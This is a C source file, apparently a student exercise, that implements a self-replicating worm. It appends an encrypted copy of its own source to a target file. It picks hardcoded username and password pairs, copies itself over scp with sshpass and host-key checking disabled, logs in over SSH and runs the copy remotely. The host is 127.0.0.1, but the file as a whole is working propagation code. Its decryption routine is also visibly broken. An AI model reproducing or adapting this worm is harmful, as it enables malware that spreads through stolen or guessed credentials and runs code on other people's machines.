//Part a 
//INIT_WORM
#include<unistd.h>
#include<libssh/libssh.h>
#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<time.h>
#include <stdbool.h>


char alphabet[]={'0','1','2','3','4','5','6','7','8','9','a','b','c','c','d','e','f','g','h','i','j',
		'k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F',
		'G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','_',
		'!','!','@','#','$','%','^','&','*','(',')','-','+','=','{','}','[',']','|',':',';','<',
		'>',',','.','?','/'};

char encrypt_code[500];
void encrypt(char code[],int key){
	//char encrypt_code[500];
	int i,j,index_of_char=999,ptr=0;
	for(i=0;i<strlen(code);i++){
		for(j=0;j<strlen(alphabet);j++){
			if(code[i]==alphabet[j]){
				index_of_char=j;
				break;
			}
		}
		encrypt_code[ptr++]=alphabet[(index_of_char+key)%strlen(alphabet)];
	}
	
}
void copyCode(char dest[]){
    FILE *fp, *fp1;
    char buf[50000];
    char init_worm[]="//INIT_WORM";
    char line[500];
    char char_key[1000];
    int i,flag,key;
    fp=fopen(__FILE__,"r");
    fp1=fopen(dest,"a+");
    fprintf(fp1, "\n################## Worm written in C by Omkar Gavhane################\n");
    while(fscanf(fp, "%[^\n] ",line) != EOF) {
	flag=1;
	for(i=0;i<strlen(init_worm);i++){
		if(line[i]!=init_worm[i]){
			flag=0;
			break;
		}
	}
            if(flag){
		key=rand();
		sprintf(char_key,"%ld",key);
	    	fprintf(fp1,"%s-%s\n",line,char_key);
		//printf("%s\n",line);
		break;
	    }
    }
    while(fscanf(fp, "%[^\n] ",line) != EOF) {
            if(strcmp(line,"//MIDD_WORM")==0){
	    	fprintf(fp1,"%s\n",line);
		//printf("%s\n",line);
		break;
	    }
	encrypt(line,key);
	for(i=0;i<strlen(line);i++){
		line[i]=encrypt_code[i];
	}
	fprintf(fp1,"%s\n",line);
	//printf("%s\n",line);

   }
	while(fscanf(fp, "%[^\n] ",line) != EOF) {
            if(strcmp(line,"//ENDD_WORM")==0){
	    	fprintf(fp1,"%s\n",line);
		//printf("%s\n",line);
		break;
	    }
	fprintf(fp1,"%s\n",line);
	//printf("%s\n",line);

   }

   fclose(fp1);
   fclose(fp);
}
void selectTarget(){
 FILE *fp;
    char c;
    char dest[] = "test.c";
    fp = fopen(dest,"a");
    if (fp == NULL){
        printf("Sorry File not found\n");
    exit(EXIT_FAILURE);
  }
copyCode(dest);

}
void infect(){
 selectTarget();
 printf("Worm written in c,just for fun\n");
}
int run_remote_cmd(ssh_session session,char *username)
{
	ssh_channel channel;
	int rc;
	char buffer[256];
	int nbytes;
	char format_string[500];
	//start new channel
	channel=ssh_channel_new(session);
	//channel open new sub-session
	rc=ssh_channel_open_session(channel);
	//send remote command request
	sprintf(format_string,"./home/%s/2111MC08_MSE_WORM",username);
	rc=ssh_channel_request_exec(channel,format_string);
	//send remote response back
	nbytes=ssh_channel_read(channel,buffer,sizeof(buffer),0);
	while(nbytes>0)
	{
		//printf("\n%s",buffer);
		nbytes=ssh_channel_read(channel,buffer,sizeof(buffer),0);
	}
	//send channel EOD to remote
	ssh_channel_send_eof(channel);
	//close channel
	ssh_channel_close(channel);
	//free channel
	ssh_channel_free(channel);
	rc=SSH_OK;
	return rc;

}

int main(int argc, char*argv[]) {
	ssh_session my_ssh_session;
 	int verbosity = SSH_LOG_PROTOCOL;
  	int port = 22;
	int rc=0;
	int random;
 	char *usernames[]={"2111mc08","2111mc09","2111mc10","2111mc11","2111mc12"};
	char *passwords[]={"2111mc@08","2111mc@09","2111mc@10","2111mc@11","2111mc@12"};
	int upper=5;
	int lower=0;
	char *username,*password,format_string[500];
	
	//Generate random number with given range ,both upper & lower including
	srand(time(0));
	random=(rand()%(upper - lower + 1)) + lower;
	//username and password of randomly generated number
  	username=usernames[random];
	password=passwords[random];
	printf("Random user %s\n",username);	
	//copy files to remote server
	sprintf(format_string,"sshpass -p %s scp -o StrictHostKeyChecking=no 2111MC08_MSE_WORM %s@127.0.0.1:/home/%s",password,username,username);
	system(format_string);
	
	my_ssh_session = ssh_new();
  	if (my_ssh_session == NULL){
		printf("\noops!!,ssh_new failed");
    		exit(-1);
	}
 
 	ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, "127.0.0.1");
  	//ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
  	ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
	
	rc=ssh_connect(my_ssh_session);
	if(rc!=SSH_OK){
		printf("\noops!!,ssh_connect failed");
		printf("\n%s",ssh_get_error(my_ssh_session));
		exit(-1);
	}
	rc=ssh_userauth_password(my_ssh_session,username,password);
	if(rc!=SSH_AUTH_SUCCESS){
		printf("\noops!!,ssh_userauth_password failed");
		printf("\n%s",ssh_get_error(my_ssh_session));
		ssh_disconnect(my_ssh_session);
		ssh_free(my_ssh_session);
		exit(-1);

	}
	rc=run_remote_cmd(my_ssh_session,username);
	ssh_disconnect(my_ssh_session);
	ssh_free(my_ssh_session);
	infect();
  	return 0;
}
//MIDD_WORM
char alphabet1[]={'0','1','2','3','4','5','6','7','8','9','a','b','c','c','d','e','f','g','h','i','j',
		'k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F',
		'G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','_',
		'!','!','@','#','$','%','^','&','*','(',')','-','+','=','{','}','[',']','|',':',';','<',
		'>',',','.','?','/'};

char decrypt_code[500];
void decrypt_algo(char code[],int key){
	int i,j,index_of_char=999,ptr=0;
	for(i=0;i<strlen(code);i++){
		for(j=0;j<strlen(alphabet);j++){
			if(code[i]==alphabet1[j]){
				index_of_char=j;
				break;
			}
		}
		decrypt_code[ptr++]=alphabet1[(index_of_char-key)%strlen(alphabet1)];
	}
}
void decrypt(){
	FILE *fp, *fp1;
	 char init_worm[]="//INIT_WORM";
    	char line[500];
    	char char_key[1000];
    	int i,flag,key,j;
    	fp=fopen(__FILE__,"r");
	while(fscanf(fp, "%[^\n] ",line) != EOF) {
	flag=1;
	for(i=0;i<strlen(init_worm);i++){
		if(line[i]!=init_worm[i]){
			flag=0;
			break;
		}
		}
            if(flag){
		while(line[i]!='\n')
			char_key[j++]=line[i];
		key=atoi(char_key);
		//sprintf(char_key,"%ld",key);
	    	//fprintf(fp1,"%s-%s\n",line,char_key);
		//printf("%s\n",line);
		break;
	    }
    	}
	 while(fscanf(fp, "%[^\n] ",line) != EOF) {
            if(strcmp(line,"//MIDD_WORM")==0){
	    	//fprintf(fp1,"%s\n",line);
		//printf("%s\n",line);
		break;
	    }
	decrypt_algo(line,key);
	for(i=0;i<strlen(line);i++){
		line[i]=encrypt_code[i];
	}
	//fprintf(fp1,"%s\n",line);
	//printf("%s\n",line);

   }


}
//ENDD_WORM

